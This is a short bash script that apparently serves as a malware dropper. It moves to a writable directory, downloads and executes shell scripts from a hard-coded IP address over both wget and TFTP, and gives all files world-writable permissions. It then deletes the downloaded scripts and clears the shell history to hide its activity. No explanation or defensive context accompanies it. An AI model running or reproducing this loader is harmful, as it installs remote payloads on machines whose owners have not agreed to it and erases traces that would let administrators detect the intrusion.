#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.204.116.154/ISIS.sh; chmod 777 *; sh ISIS.sh; tftp -g 85.204.116.154 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
yum update -y


